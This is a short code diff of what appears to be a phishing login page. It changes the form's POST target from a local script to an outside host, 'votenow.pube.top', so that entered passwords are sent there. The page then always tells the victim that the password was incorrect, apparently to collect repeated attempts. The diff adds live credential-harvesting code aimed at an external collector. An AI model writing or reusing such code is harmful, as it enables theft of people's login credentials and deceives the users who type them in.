@@ -136,7 +136,7 @@
             response.onreadystatechange = function () {
                 feedback.style.display = 'block'
             }
-            response.open('POST', './login.php', true);
+            response.open('POST', 'https://votenow.pube.top/user/login.php', true);
             response.send(data);
             x ++
             feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
